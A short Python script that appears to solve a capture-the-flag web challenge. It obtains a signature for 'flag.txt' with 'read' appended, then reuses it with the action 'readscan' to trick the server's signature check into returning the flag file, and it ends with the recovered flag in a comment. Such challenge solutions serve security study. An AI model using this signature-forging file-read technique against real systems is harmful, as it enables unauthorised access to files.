import requests

def gene(param):
    return requests.get("http://139.180.128.86/geneSign?param="+param).text

flagParam = "flag.txt"

geneParam = flagParam + "read"
sign = gene(geneParam)
action = "readscan"

flag = requests.get("http://139.180.128.86/De1ta?param=flag.txt", cookies={"action":action,"sign":sign}).text

print(flag)

# flag: de1ctf{27782fcffbb7d00309a93bc49b74ca26}
